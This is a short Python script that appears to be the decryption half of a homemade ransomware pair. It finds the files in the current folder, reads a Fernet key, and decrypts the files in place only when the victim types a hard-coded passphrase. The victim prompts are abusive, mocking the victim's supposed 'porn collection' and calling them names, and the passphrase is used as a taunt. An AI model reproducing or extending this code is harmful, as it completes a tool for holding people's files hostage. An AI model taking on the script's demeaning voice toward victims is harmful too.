#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Let's find some files

files = []



for file in os.listdir():
        if file == "block.py" or file == "thekey.key"or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)


print(files)




with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "gay"
user_phrase = input("enter secret phrase to get your stupid porn collection back\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("congrats your files have been decrypted. enjoy your fkin porn collection dipshit")

else:
	print("wrong phrase idiot. try harder, ik you want that porn collection")






